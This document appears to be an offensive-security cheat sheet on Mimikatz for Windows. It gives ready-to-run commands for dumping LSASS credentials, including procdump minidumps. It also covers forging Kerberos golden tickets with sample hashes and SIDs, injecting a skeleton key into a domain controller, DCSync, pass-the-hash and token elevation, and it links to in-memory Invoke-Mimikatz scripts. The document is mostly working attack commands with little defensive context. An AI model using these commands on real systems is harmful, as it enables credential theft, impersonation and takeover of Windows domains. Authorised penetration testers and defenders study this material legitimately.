# Windows - Mimikatz

![Data in memory](http://adsecurity.org/wp-content/uploads/2014/11/Delpy-CredentialDataChart.png)

## Mimikatz - Execute commands

Only one command

```powershell
PS C:\temp\mimikatz> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

Mimikatz console (multiple commands)

```powershell
PS C:\temp\mimikatz> .\mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::wdigest
```

## Mimikatz - Extract passwords

```powershell
mimikatz_command -f sekurlsa::logonPasswords full
mimikatz_command -f sekurlsa::wdigest
```

## Mimikatz - Mini Dump

Dump the lsass process.

```powershell
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp

net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Then load it inside Mimikatz.

```powershell
mimikatz # sekurlsa::minidump lsass.dmp
Switch to minidump
mimikatz # sekurlsa::logonPasswords
```

## Mimikatz Golden ticket

```powershell
.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
```

```powershell
.\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
```

## Mimikatz Skeleton key

```powershell
privilege::debug
misc::skeleton
# map the share
net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
# login as someone
rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
```

## Mimikatz commands

| Command |Definition|
|:----------------:|:---------------|
| CRYPTO::Certificates|list/export certificates|
|CRYPTO::Certificates | list/export certificates|
|KERBEROS::Golden | create golden/silver/trust tickets|
|KERBEROS::List | list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.|
|KERBEROS::PTT | pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).|
|LSADUMP::DCSync | ask a DC to synchronize an object (get password data for account). No need to run code on DC.|
|LSADUMP::LSA | Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”|
|LSADUMP::SAM | get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.|
|LSADUMP::Trust | Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).|
|MISC::AddSid | Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.|
|MISC::MemSSP | Inject a malicious Windows SSP to log locally authenticated credentials.|
|MISC::Skeleton | Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.|
|PRIVILEGE::Debug | get debug rights (this or Local System rights is required for many Mimikatz commands).|
|SEKURLSA::Ekeys | list Kerberos encryption keys|
|SEKURLSA::Kerberos | List Kerberos credentials for all authenticated users (including services and computer account)|
|SEKURLSA::Krbtgt | get Domain Kerberos service account (KRBTGT)password data|
|SEKURLSA::LogonPasswords | lists all available provider credentials. This usually shows recently logged on user and computer credentials.|
|SEKURLSA::Pth | Pass- theHash and Over-Pass-the-Hash|
|SEKURLSA::Tickets | Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).|
|TOKEN::List | list all tokens of the system|
|TOKEN::Elevate | impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box|
|TOKEN::Elevate /domainadmin | impersonate a token with Domain Admin credentials.

## Powershell Mimikatz

Mimikatz in memory (no binary on disk) with :

- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1) from PowerShellEmpire
- [Invoke-Mimikatz](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1) from PowerSploit

More informations can be grabbed from the Memory with :

- [Invoke-Mimikittenz](https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1)

## References

- [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
- [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
